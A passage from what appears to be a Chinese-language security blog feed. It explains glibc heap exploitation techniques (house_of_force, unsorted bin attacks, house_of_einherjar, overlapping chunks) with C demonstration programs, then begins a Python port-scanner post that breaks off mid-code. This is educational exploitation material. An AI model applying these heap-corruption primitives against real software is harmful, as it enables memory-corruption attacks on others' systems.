  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nData inside chunk p3: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span> 


<span class="token punctuation">}</span></code></pre>
<p>首先正常释放chunk p4 然后通过溢出等手法 修改chunk p2的<code>size</code>字段 修改为<code>sizeof(chunk p2+chunk p3+chunk p4)</code>的值 这样当后续<code>free(p2)</code>的时候 free就会错误的判断chunk大小 将几个chunk合并释放 紧接着<code>free</code>就会错误的修改chunk p5的<code>size</code>字段 这样在后续<code>malloc(chunk p2+chunk p3+chunk p4-0x10)</code>大小的chunk时就可以拿到重叠的大chunk了</p>
<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h3><p><code>house_of_force</code>是一种通过改写<code>top chunk</code>的<code>size</code>字段 以达到欺骗<code>malloc</code>返回任意地址的chunk 因为在空闲内存的最高处 必然存在一块空闲的chunk 即为top chunk 当<code>bin</code>和<code>fastbin</code>都不能满足分配的需要时 malloc会自动从top chunk中分配一块适合的空间给用户使用 所以top chunk的size大小是会随着chunk的分配和释放而变化的 如果用户可以通过溢出等方式来控制top chunk的<code>size</code>字段 那么就可以分配一个巨大的chunk来达到任意地址写的目的 在glibc中 malloc时会对用户申请的大小和top chunk的<code>size</code>大小进行验证</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 获取当前的top chunk，并计算其对应的大小</span>
victim <span class="token operator">=</span> av<span class="token operator">-></span>top<span class="token punctuation">;</span>
size   <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>
    remainder      <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
    av<span class="token operator">-></span>top        <span class="token operator">=</span> remainder<span class="token punctuation">;</span>
    <span class="token function">set_head</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>
            <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set_head</span><span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">check_malloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> p<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可以清晰的看到 如果<code>size</code>字段无限大的话 理论上用户就可以分配到无限大的chunk 也就能实现任意地址读写 因为原本样例写的过于臃肿 我自己写了一个简单版的样例来实现<code>house_of_force</code>攻击</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"abc"</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> <span class="token operator">*</span>top_ptr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>p1<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>top_ptr<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>a<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>top_ptr<span class="token number">-0x10</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p3<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">// printf("%s\n",p3);</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span><span class="token string">"bcd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>首先<code>malloc</code>一个紧邻着top chunk的chunk 大小为0x10 那么实际上这个chunk可用的大小为0x18 因为如果两个相邻的chunk 且前方的chunk是正在使用的话 后方chunk的<code>prev_size</code>字段是无效的 且可以被前方的chunk存储数据 所以可以推算出top chunk的<code>size</code>字段的地址<code>top_ptr</code> 注意上方glibc中的源码 发现在检验<code>size</code>大小的时候是将<code>size</code>转换为了<code>unsigned long</code>那么就可以将其值设为-1 利用整数溢出 就能轻松绕过<code>size</code>检验 接下来是计算需要将top chunk的地址抬到哪个地方 以方便我们下次<code>malloc</code>时就分配到指定位置的chunk 这里size的计算公式是:<code>目标地址-top chunk地址-chunk头大小</code> 接下来就是<code>malloc(size)</code> 这个时候会把top chunk抬到合适的位置 最后直接<code>malloc</code>就可以得到指定位置的chunk 可以随意覆写</p>
<h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h3><p>这个样例可以让用户在栈上伪造一个chunk然后通过修改<code>unsorted bin</code>中的chunk的bk指针 来使<code>malloc</code>时检索到在栈上的fake chunk 代码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  intptr_t stack_buffer<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating the victim chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  intptr_t<span class="token operator">*</span> victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  intptr_t<span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Create a fake chunk on the stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set size for next allocation and the bk pointer to any writable address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
  stack_buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>stack_buffer<span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">//------------VULNERABILITY-----------</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  victim<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
  victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>intptr_t<span class="token punctuation">)</span>stack_buffer<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// victim->bk is pointing to stack</span>
  <span class="token comment" spellcheck="true">//------------------------------------</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now next malloc will return the region of our fake chunk: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_buffer<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x100): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>首先是分配了两个chunk 这里的chunk p1主要是以防chunk victim被<code>free</code>后和<code>top chunk</code>合并 然后我们在栈上伪造一个chunk 主要是伪造chunk头的<code>size</code>字段和<code>bk</code>指针 这里的bk指针理论上指向任意一个可写的地址即可 但是这里我尝试的只要不是指向fake chunk头 程序就会crash..接下来就是需要修改<code>unsorted bin</code>中的chunk了 首先是修改chunk的<code>size</code>字段 以让后续<code>malloc</code>的时候 能够取出正确大小的fack chunk 最后修改<code>bk</code>指针指向fake chunk 只要后续<code>malloc(0x100)</code>就可以拿到栈上的fake chunk了</p>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><p>这个案例是<code>unsorted_bin_into_stack</code>的延伸吧 同样是需要控制<code>unsorted bin</code>的<code>bk</code>指针 可以造成的后果是向任意位置写入<code>main_arena+88</code>的地址 然后可以就此泄漏<code>libc基地址</code>或者利用这个任意写绕开一些限制 漏洞形成的原理主要是因为当从<code>unsorted bin</code>中<code>malloc</code>时 如果不匹配的chunk会执行<code>unlink</code>操作 将该chunk从<code>unsorted bin</code>中取出 然后放入对应的<code>bin</code>中 其中实现的代码是</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*    remove    from    unsorted    list    */</span>
<span class="token function">unsorted_chunks</span>    <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk    <span class="token operator">=</span>    bck<span class="token punctuation">;</span>                                        
bck<span class="token operator">-></span>fd    <span class="token operator">=</span>    <span class="token function">unsorted_chunks</span>    <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>这也就会造成会向<code>free chunk</code>的<code>bk指针指向的位置+2的地方</code>写入<code>unsorted bin</code>的头部信息 也就是<code>main_arena+88</code>的地址 也就可以通过偏移计算出<code>libc基地址</code>了</p>
<p>案例代码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span>
           <span class="token string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's first look at the target we want to rewrite on stack:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">,</span> stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate first normal chunk on the heap at: %p\n"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span>
           <span class="token string">"the first one during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span>
           <span class="token string">"point to %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">//------------VULNERABILITY-----------</span>

    p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">//------------------------------------</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span>
           <span class="token string">"rewritten:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><code>stack_var</code>是我们要写入信息的地址 然后正常<code>malloc</code>一个chunk 下面那个<code>malloc(500)</code>是为了防止chunk p在<code>free</code>之后合并进<code>top chunk</code> 在<code>free</code>之后修改chunk p的<code>bk</code>指针指向<code>stack_var-2</code>的地方 再<code>malloc</code>就可以触发<code>unlink</code>机制向指定位置写入了</p>
<h3 id="house-of-elnherjar"><a href="#house-of-elnherjar" class="headerlink" title="house_of_elnherjar"></a>house_of_elnherjar</h3><p><code>house_of_elnherjar</code>攻击可以造成下次<code>malloc</code>到任意地址附近 他需要的前置漏洞是有一个单字节溢出漏洞 需要能够更改一个chunk的<code>PREV_INUSE</code> 且需要能够控制该chunk的<code>prev_size</code>字段 其实说到这里应该就可以构想出来漏洞的利用情况了 因为更改了<code>PREV_INUSE</code>字段 在<code>free</code>时glibc会检测到 前方还有一个空闲的chunk想要合并 在各种检测过后 我们控制<code>prev_size</code>将其修改为 <code>目的地址-目前chunk地址</code> 就可以合并一个任意大小的区域 让chunk合并到指定地址上 这样在下次<code>malloc</code>的时候 就可以在指定地址附近了</p>
<p>案例代码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> s0<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//构造fake chunk</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> s2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> s0<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    s0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">;</span>
    s0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">;</span>
    s0<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>s0<span class="token punctuation">;</span>
    s0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>s0<span class="token punctuation">;</span>
    s0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>s0<span class="token punctuation">;</span>
    s0<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span>s0<span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> s3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// s0[-2]=(void *)(s0-2)-(void *)(s2-2);</span>
    <span class="token comment" spellcheck="true">// printf("%p",s3[-1]);</span>
    s3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">;</span>
    s3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s3<span class="token number">-2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    s0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s3<span class="token number">-2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">,</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>首先是在栈上构造<code>fake chunk</code>注意此刻<code>fake chunk</code>的<code>fd</code>和<code>bk</code>指针都需要指向自己 为了绕过上面讲过的<code>unlink</code>检测 即<code>p->bk->fd=p && p->fd->bk=p</code> 因为我们不需要构建另外一个fake chunk了 就直接让<code>fd</code>和<code>bk</code>都等于fake chunk就可以绕过了 这里<code>s2=malloc(0xf0)</code>是为了防止后续<code>free(s3)</code>的时候chunk s3被合并进top chunk 没有使用到他 然后修改chunk s3的<code>PREV_INUSE</code>位 使glibc认为前置chunk是被<code>free</code>掉过的 然后修改<code>prev_size</code>字段 将其值设为<code>chunk地址-目的地址</code>即可 然后将fake chunk的size字段也改成一样的 这是用于绕过<code>unlink</code>时 验证的<code>p->prev_size = p->bk->size</code> 这里的bk不是使用bk指针计算的 而是使用偏移计算的 所以<code>bk</code>指针我们可以不用修改 最后<code>free(s3)</code> 此时的chunk已经合并 下次再<code>malloc</code>时就是从fake chunk开始分配内存了</p>
<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h3><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[端口扫描脚本]]></title>
      <url>/2020/01/18/duan-kou-sao-miao-jiao-ben/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>Python小工具第二弹???这次脚本终于优化了传参方式..使用了<code>optparse</code>这个库进行传参 具体的端口扫描功能实现是利用<code>socket</code>库实现的 中间排bug排的快死了..</p>
<h2 id="端口扫描脚本-V1-0"><a href="#端口扫描脚本-V1-0" class="headerlink" title="端口扫描脚本 V1.0"></a>端口扫描脚本 V1.0</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> optparse
<span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>

parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'usage %prog -H &lt;target host> -P &lt;target port>'</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-H'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgthost'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-P'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgtport'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>

<span class="token punctuation">(</span>option<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
tgthost<span class="token operator">=</span>option<span class="token punctuation">.</span>tgthost
tgtport<span class="token operator">=</span>option<span class="token punctuation">.</span>tgtport

<span class="token keyword">if</span><span class="token punctuation">(</span>tgthost<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>tgtport<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span>usage<span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 解析IP</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    tgtip<span class="token operator">=</span>gethostbyname<span class="token punctuation">(</span>tgthost<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]解析IP为:%s"</span><span class="token operator">%</span>tgtip<span class="token punctuation">)</span>
